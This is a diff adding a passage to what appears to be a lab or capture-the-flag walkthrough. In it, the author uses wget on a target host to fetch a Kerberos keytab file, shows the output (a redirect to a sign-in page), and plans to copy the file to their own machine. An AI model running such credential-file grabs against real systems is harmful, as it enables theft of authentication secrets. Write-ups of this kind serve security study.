@@ -941,5 +941,27 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 Ill start this on the target
 
 ```python
+wget http://nix01.casper.hsm/krb5.keytab                                               
+--2026-08-05 19:31:37--  http://nix01.casper.hsm/krb5.keytab
+Resolving nix01.casper.hsm (nix01.casper.hsm)... 10.0.20.54
+Connecting to nix01.casper.hsm (nix01.casper.hsm)|10.0.20.54|:80... connected.
+HTTP request sent, awaiting response... 302 Found
+Location: http://nix01.casper.hsm/users/sign_in [following]
+--2026-08-05 19:31:37--  http://nix01.casper.hsm/users/sign_in
+Reusing existing connection to nix01.casper.hsm:80.
+HTTP request sent, awaiting response... 200 OK
+Length: 10384 (10K) [text/html]
+Saving to: ‘krb5.keytab’
+
+krb5.keytab                                        100%[==============================================================================================================>]  10.14K  --.-KB/s    in 0s      
+
+2026-08-05 19:31:38 (1.18 GB/s) - ‘krb5.keytab’ saved [10384/10384]
+```
+
+Then just wget it to my machine!
+
+Then ill clone the repo on my machine
+
+```python
 
 ```
